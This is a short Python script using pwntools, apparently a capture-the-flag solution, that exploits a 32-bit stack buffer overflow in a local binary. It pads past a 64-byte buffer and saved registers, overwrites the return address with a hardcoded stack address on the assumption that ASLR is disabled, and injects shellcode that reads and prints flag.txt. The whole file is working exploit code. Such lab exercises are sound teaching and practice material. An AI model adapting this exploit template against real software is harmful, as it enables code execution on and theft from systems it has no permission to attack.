from pwn import *

gen_filename = ""

e = ELF(gen_filename)
p = process([], env={}, executable=gen_filename, aslr=False)

# this assumes no aslr
stack_base = 0xfff00000
buff = stack_base + 0xfde20

payload = b''
payload += 64 * b'a'  # buffer
payload +=  4 * b'b'  # ebp
payload +=  4 * b'c'  # ebx
payload +=  4 * b'd'  # padding
dest = buff + len(payload) + 4
payload += p32(dest)  # eip
shellcode = shellcraft.i386.linux.cat("flag.txt") + shellcraft.i386.linux.exit(0)
payload += asm(shellcode)
p.sendline(payload)

p.stream()

